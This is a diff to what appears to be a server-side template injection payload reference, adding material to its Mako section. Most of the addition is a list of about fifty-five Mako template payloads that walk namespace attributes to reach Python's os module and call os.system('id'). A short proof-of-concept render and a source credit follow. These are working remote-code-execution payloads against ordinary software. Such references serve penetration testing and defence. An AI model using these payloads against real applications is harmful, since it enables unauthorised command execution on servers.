@@ -335,6 +335,9 @@ $str.valueOf($chr.toChars($out.read()))
 
 ## Mako
 
+[Official website](https://www.makotemplates.org/)
+> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.
+
 ```python
 <%
 import os
@@ -342,6 +345,76 @@ x=os.popen('id').read()
 %>
 ${x}
 ```
+
+### Direct access to os from TemplateNamespace:
+
+Any of these payloads allows direct access to the `os` module 
+
+```python
+${self.module.cache.util.os.system("id")}
+${self.module.runtime.util.os.system("id")}
+${self.template.module.cache.util.os.system("id")}
+${self.module.cache.compat.inspect.os.system("id")}
+${self.__init__.__globals__['util'].os.system('id')}
+${self.template.module.runtime.util.os.system("id")}
+${self.module.filters.compat.inspect.os.system("id")}
+${self.module.runtime.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.util.os.system("id")}
+${self.template.__init__.__globals__['os'].system('id')}
+${self.module.cache.util.compat.inspect.os.system("id")}
+${self.module.runtime.util.compat.inspect.os.system("id")}
+${self.template._mmarker.module.cache.util.os.system("id")}
+${self.template.module.cache.compat.inspect.os.system("id")}
+${self.module.cache.compat.inspect.linecache.os.system("id")}
+${self.template._mmarker.module.runtime.util.os.system("id")}
+${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
+${self.template.module.filters.compat.inspect.os.system("id")}
+${self.template.module.runtime.compat.inspect.os.system("id")}
+${self.module.filters.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.exceptions.util.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
+${self.context._with_template.module.cache.util.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.template.module.cache.util.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.util.os.system("id")}
+${self.module.cache.util.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.util.compat.inspect.os.system("id")}
+${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
+${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
+${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
+${self.template.module.cache.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
+${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.filters.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
+${self.context._with_template._mmarker.module.cache.util.os.system("id")}
+${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
+${self.context._with_template.module.cache.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
+${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
+${self.context._with_template.module.filters.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
+```
+
+PoC :
+
+```python
+>>> print(Template("${self.module.cache.util.os}").render())
+<module 'os' from '/usr/local/lib/python3.10/os.py'>
+```
+
+Source [@podalirius_](https://twitter.com/podalirius_) : [https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
 
 ## Jinja2
 
